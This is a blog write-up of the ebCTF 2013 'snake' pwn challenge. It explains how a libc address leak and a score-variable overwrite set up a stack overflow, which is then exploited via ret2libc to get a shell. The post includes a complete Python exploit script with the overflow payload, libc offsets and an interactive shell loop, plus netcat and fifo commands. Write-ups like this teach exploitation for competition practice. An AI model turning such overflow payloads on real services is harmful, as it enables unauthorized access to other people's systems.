---
title: ebctf 2013 pwn 300 snake writeup
author: zTrix
layout: post
permalink: /ebctf-2013-pwn-300-snake-writeup/
categories:
  - CTF
  - writeup
---
It&#8217;s a snake game.

Playing it for a while, we find that w,s,a,d can control the snake in 4 directions, &#8220;enter&#8221; key will stop the snake, and b will start the game in single step mode.

The clue printed before game started is important, it says, `HIT (ALMOST) ANY KEY TO START GAME`, so there must be some key which will generate different output. After some try and fail, we find that &#8216;#&#8217; key will dump the binary file in hex code. This is the first breakthrough we got. Now we can disassemble the binary and play the game locally.

Using the binary file, we find a stack overflow vulnerability immediately, which is located at game exit, used to input the player&#8217;s name, exposed by function `fgets`. But the logic of the game shows we need a score larger than 313336, which is impossible to acquire by playing the game.

By reading the assembly of the binary, we got some more findings. The first discovery indicates that if we get a score equal to 666, the program will print out some memory layout information. The second discovery shows that, if we get 1221 score, the program will erase the last 4 wall of the game board by space. Furthermore, the memory location of the walls locate adjacently to that of the score variable.

Knowing above, we can compose a solution now. First, use some input sequence, we can eat 6 dots and get the libc.so base address in memory. Then we eat 6 more dots, the bottom wall will open a 4-bytes-wide door. Move snake outside the play field, and overwrite 4 bytes after the wall, the score variable will be large enough to pass the high score check.

[<img src="http://www.blue-lotus.net/wp-content/uploads/2013/06/1221.png" alt="" width="600" class="alignnone size-medium wp-image-634" />][1]

Now we just need to grab the shell using ret2libc. Calculate the system function offset and &#8220;/bin/sh&#8221; offset, using the offset provided by memory info printed. The final script is as follows, note that the system offset and &#8220;/bin/sh&#8221; offset need to be recalculated for different platforms.

    import struct
    
    f = open('fifo', 'w')
    
    def send(cmd):
        global f
        f.write(cmd)
        f.flush()
    
    send('b')
    s = 'd' * 28 + 's' * 3 + 'd' * 2 + 'w' * 5 + 'a' * 23 + 's' * 11 + 'd'* 27 + 'w' + 'w' * 3 + 'a' * 27 + 'w' * 5 + 'd' * 50 + 's' * 2 + 'a' * 38 + 's' * 11 + 'd' * 7 + 'w' * 7 + 'a' * 6 + 'w' * 9 + 'd' * 17 + 'd' * 2  + 'd' * 23 + 's' * 17 + 'd' * 6
    
    send(s)
    
    b = raw_input('please enter base address: ')
    
    ba = "base = 0x" + b
    print ba
    exec ba
    
    #base = 0xf75fe000
    g = 'A' * 140 + struct.pack('I', base + 0x3e6c0) + struct.pack('I', base + 0x3e6c0 - 0xd1d0) + struct.pack('I', base + 0x160cbf) + struct.pack('I', 10) + 'pwd\n'
    
    send(g)
    
    while True:
        send(raw_input('$ ') + '\n\n')
    
    raw_input("\npress any key to exit ...")
    

We used mkfifo to create a fifo file first. Then do the following:

    
    $ nc "ip" "port" < fifo
    $ python2 solve.py
      ... input the libc base address when it prints out.
    </pre>
    <p></p>
    Some solutions we seen write a lot of code to read server input and parse the libc base address, but it's much more easier to use pipe and input it manually. <img src='http://www.blue-lotus.net/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /> 
    
    
    aay, cbmixx, kelwin contribute most of the work for solving this problem. Thanks very much!

 [1]: http://www.blue-lotus.net/wp-content/uploads/2013/06/1221.png